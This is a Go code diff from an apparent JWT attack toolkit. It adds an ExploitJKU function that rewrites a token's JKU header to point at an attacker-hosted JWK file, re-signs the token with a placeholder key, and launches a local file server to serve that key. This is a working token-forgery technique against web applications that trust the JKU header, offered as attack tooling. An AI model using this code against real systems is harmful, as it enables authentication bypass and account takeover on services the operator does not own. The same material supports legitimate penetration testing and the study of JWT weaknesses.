@@ -1,41 +1,47 @@
 package attacks
 
 import (
+	"JWTechniques/ctrl"
 	"fmt"
 	"net/http"
 	"strconv"
+
+	"github.com/golang-jwt/jwt/v5"
 )
 
-func changeJKUValue(JSONFile string) {
-}
+const (
+	pathToJWKFile string = "/files/jwk.json"
+)
 
-func LaunchServer(port int, jsonFile string) {
+func LaunchServer(port int) {
 
-	fmt.Printf("Server launch on port %d\n", port)
+	fmt.Printf("The server is being launched on port %d\n", port)
 
+	//Serve files from the "./files" directory
 	fs := http.FileServer(http.Dir("./files"))
-
 	http.Handle("/", fs)
 
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 }
 
-func ExploitJKU(tokenString string) {
+func ExploitJKU(token *jwt.Token) string {
 
-	// token, err := jwt.Parse(tokenString, func(token *jwt.Token) (any, error) {
-	// 	return []byte("AllYourBase"), nil
-	// })
+	//Change the value of the "JKU" header to set the path to our file containing our private key
+	newToken, err := ctrl.ChangeValue(token, "JKU", pathToJWKFile, true)
 
-	// if err != nil {
-	// 	fmt.Printf("err = %s \n", err)
-	// } else {
-	// 	fmt.Printf("Token = %s", token)
-	// }
+	if err != nil {
+		fmt.Printf("An error ocurred while modifying the value of \"JWK\" header : %s \n", err)
+		return ""
+	}
 
-	// test := jwt.ParseWithClaims(token)
+	//Sign the token with our private key
+	newJWT := ctrl.SignJWT(newToken, []byte("secret")) //TODO : change secret with correct value
 
-	// launchServer(12345)
+	//Launch the server that will serve the jwk file
+	go func() {
+		LaunchServer(12345)
+	}()
 
-	// //Convert the JWT string into a JWT object
-	// jwtoken := jwt.New(jwt.SigningMethodES256)
+	return newJWT
+
 }
